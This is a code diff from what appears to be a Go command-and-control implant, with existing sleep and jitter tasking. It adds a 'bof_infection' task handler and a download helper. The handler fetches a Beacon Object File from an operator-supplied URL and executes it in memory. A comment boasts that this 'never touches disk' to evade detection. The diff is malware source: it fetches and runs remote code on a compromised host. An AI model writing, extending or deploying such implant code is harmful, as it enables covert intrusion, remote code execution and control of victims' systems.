@@ -6,6 +6,8 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"io"
+	"net/http"
 	"runtime"
 	"strconv"
 	"strings"
@@ -137,4 +139,49 @@ func handleSetSleep(task Task, res *TaskResult) {
 		}
 	}
 	res.Output = fmt.Sprintf("sleep set to %d s, jitter %d%%", Interval, Jitter)
+}
+
+// handleBOFInfection downloads a BOF .o file from the given URL and executes
+// it in-memory (never touches disk).
+func handleBOFInfection(task Task, res *TaskResult) {
+	url := task.Command
+	if url == "" {
+		res.Error = "bof_infection: no URL provided"
+		return
+	}
+
+	data, err := downloadBytes(url)
+	if err != nil {
+		res.Error = fmt.Sprintf("bof_infection: download failed: %v", err)
+		return
+	}
+
+	// task.Shell holds the BOF arguments
+	out, err := executeBOF(data, task.Shell)
+	if err != nil {
+		res.Error = fmt.Sprintf("bof_infection: %v", err)
+	} else {
+		res.Output = out
+	}
+}
+
+// downloadBytes fetches raw bytes from an HTTP(S) URL into memory.
+func downloadBytes(urlStr string) ([]byte, error) {
+	req, err := http.NewRequest("GET", urlStr, nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
+	}
+
+	return io.ReadAll(resp.Body)
 }
